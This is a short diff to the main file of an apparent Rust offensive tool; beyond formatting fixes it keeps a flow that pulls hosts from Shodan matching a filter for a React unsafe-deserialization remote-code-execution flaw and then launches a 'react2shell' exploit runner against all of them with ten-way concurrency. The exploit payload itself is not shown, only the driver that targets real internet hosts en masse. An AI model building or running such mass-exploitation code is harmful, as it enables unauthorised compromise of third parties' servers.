@@ -1,6 +1,6 @@
-mod osint;
 mod exploit;
 mod frameworks;
+mod osint;
 
 use crate::exploit::react::react_unsafely_deserialize_rce;
 use crate::osint::shodan;
@@ -16,11 +16,19 @@ async fn main() {
     //     ..Default::default()
     // };
 
-    let rsp = shodan.query_raw_many(react_unsafely_deserialize_rce::ReactUnsafelyDeserializeRce::shodan_basic_filter()).await;
+    let rsp = shodan
+        .query_raw_many(
+            react_unsafely_deserialize_rce::ReactUnsafelyDeserializeRce::shodan_basic_filter(),
+        )
+        .await;
     let shodan_hosts_many = shodan.get_hosts_from_responses(rsp).await;
-    println!("{:#?}",shodan_hosts_many);
+    println!("{:#?}", shodan_hosts_many);
 
-    let react2shell = react_unsafely_deserialize_rce::ReactUnsafelyDeserializeRce::new(prefix_payload.parse().unwrap(), shodan_hosts_many, 10);
-    react2shell.start().expect("TODO: panic message");
+    let react2shell = react_unsafely_deserialize_rce::ReactUnsafelyDeserializeRce::new(
+        prefix_payload.parse().unwrap(),
+        shodan_hosts_many,
+        10,
+    );
+    react2shell.start().await.expect("TODO: panic message");
     // println!("{total:?}");
 }
